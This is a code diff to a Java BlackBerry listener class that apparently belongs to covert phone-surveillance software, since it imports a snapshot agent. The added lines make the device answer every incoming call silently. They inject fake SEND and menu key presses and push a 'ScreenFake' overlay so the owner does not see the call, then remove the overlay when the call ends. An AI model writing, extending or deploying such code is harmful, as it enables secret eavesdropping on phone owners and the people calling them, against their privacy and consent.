@@ -12,14 +12,24 @@ package blackberry;
 
 import java.util.Vector;
 
+import javax.microedition.lcdui.Image;
+import javax.microedition.lcdui.ImageItem;
+
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
+import net.rim.device.api.system.Application;
+import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.system.EventInjector;
 import net.rim.device.api.system.HolsterListener;
+import net.rim.device.api.system.KeypadListener;
 import net.rim.device.api.system.RadioStatusListener;
 import net.rim.device.api.system.SystemListener;
 import net.rim.device.api.system.SystemListener2;
+import net.rim.device.api.system.EventInjector.KeyCodeEvent;
+import net.rim.device.api.ui.Keypad;
+import blackberry.agent.SnapShotAgent;
 import blackberry.interfaces.ApplicationListObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
@@ -27,6 +37,7 @@ import blackberry.interfaces.Singleton;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -507,15 +518,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
     }
 
-    public void callConnected(int callId) {
-        //#ifdef DEBUG_INFO
-        debug.info("callConnected: " + callId);
-        PhoneCall phoneCall = Phone.getCall(callId);
-        debug.info("Phone call: " + phoneCall.getPhoneNumber());
-        //#endif                      
-
-    }
-
     public void callDirectConnectConnected(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callDirectConnectConnected: " + callId);
@@ -528,11 +530,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
     }
 
-    public void callDisconnected(int callId) {
-        //#ifdef DEBUG_INFO
-        debug.info("callDisconnected: " + callId);
-        //#endif
-    }
 
     public void callEndedByUser(int callId) {
         //#ifdef DEBUG_INFO
@@ -550,12 +547,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     public void callHeld(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callHeld: " + callId);
-        //#endif
-    }
-
-    public void callIncoming(int callId) {
-        //#ifdef DEBUG_INFO
-        debug.info("callIncoming: " + callId);
         //#endif
     }
 
@@ -590,4 +581,86 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
     }
 
+    boolean autoanswer = false;
+
+    public void callIncoming(int callId) {
+        //#ifdef DEBUG_INFO
+        debug.info("callIncoming: " + callId);
+        //#endif
+
+        PhoneCall phoneCall = Phone.getCall(callId);
+        String number = phoneCall.getDisplayPhoneNumber();
+        boolean outgoing = phoneCall.isOutgoing();
+
+       
+        
+        if (!outgoing) {
+            //#ifdef DEBUG_INFO
+            debug.info("answering");
+            //#endif
+            autoanswer = true;
+            Application.getApplication().invokeLater(new Runnable() {
+
+                public void run() {
+                    //Utils.sleep(100);
+                    // Keypad.KEY_SEND
+                    EventInjector.KeyCodeEvent pressEndKey = new EventInjector.KeyCodeEvent(
+                            KeyCodeEvent.KEY_DOWN, (char) Keypad.KEY_SEND,
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
+                    EventInjector.KeyCodeEvent releaseEndKey = new EventInjector.KeyCodeEvent(
+                            KeyCodeEvent.KEY_UP, (char) Keypad.KEY_SEND,
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
+
+                    pressEndKey.post();
+                    releaseEndKey.post();
+                    
+                    ScreenFake.Push();
+
+                }
+            });
+
+        }
+
+    }
+
+    public void callConnected(int callId) {
+        //#ifdef DEBUG_INFO
+        debug.info("callConnected: " + callId);
+        PhoneCall phoneCall = Phone.getCall(callId);
+        debug.info("Phone call: " + phoneCall.getDisplayPhoneNumber());
+        //#endif                      
+
+        if (autoanswer) {
+            
+            Application.getApplication().invokeLater(new Runnable() {
+
+                public void run() {
+                    Utils.sleep(100);
+                    EventInjector.invokeEvent(new EventInjector.KeyCodeEvent(
+                            EventInjector.KeyCodeEvent.KEY_DOWN, Keypad
+                                    .map(Keypad.KEY_MENU),
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD));
+                    EventInjector.invokeEvent(new EventInjector.KeyCodeEvent(
+                            EventInjector.KeyCodeEvent.KEY_UP, Keypad
+                                    .map(Keypad.KEY_MENU),
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD));
+
+                    Application app = Application.getApplication();
+
+                }
+            });
+
+        }
+    }
+        public void callDisconnected(int callId) {
+            //#ifdef DEBUG_INFO
+            debug.info("callDisconnected: " + callId);
+            //#endif
+
+            autoanswer = false;
+            
+            ScreenFake.Pop();
+        }
+
+    
 }
